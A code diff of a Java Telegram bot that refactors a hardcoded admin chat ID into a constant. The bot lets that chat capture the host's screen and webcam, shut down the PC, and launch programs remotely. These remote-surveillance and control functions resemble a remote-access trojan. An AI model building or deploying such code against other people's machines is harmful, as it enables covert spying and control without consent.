@@ -11,6 +11,7 @@ import java.util.Map;
 
 public class Hello extends TelegramLongPollingBot {
 
+    private static final String ADMIN = "5401328104";
 
     @Override
     public String getBotUsername() {
@@ -52,7 +53,7 @@ public class Hello extends TelegramLongPollingBot {
                 switch (command) {
 
                     case "/screen":
-                        if (response.getChatId().equals("5401328104")) {
+                        if (response.getChatId().equals(ADMIN)) {
                             photo.setChatId(update.getMessage().getChatId().toString());
                             Starter.callScreen();
                             Thread.sleep(2000);
@@ -70,7 +71,7 @@ public class Hello extends TelegramLongPollingBot {
                         }
                         break;
                     case "/webcam":
-                        if (response.getChatId().equals("5401328104")) {
+                        if (response.getChatId().equals(ADMIN)) {
                             photo.setChatId(update.getMessage().getChatId().toString());
                             Starter.callCam();
                             Thread.sleep(2000);
@@ -87,14 +88,14 @@ public class Hello extends TelegramLongPollingBot {
                         }
                         break;
                     case "/offpc":
-                        if (response.getChatId().equals("5401328104")) {
+                        if (response.getChatId().equals(ADMIN)) {
                             offPc();
                         }else{
                             response.setText("You not have permission by this bot");
                         execute(response);}
                         break;
                     case "/notepad":
-                        if (response.getChatId().equals("5401328104")) {
+                        if (response.getChatId().equals(ADMIN)) {
                             Runtime rs = Runtime.getRuntime();
                             try {
                                 rs.exec("notepad");
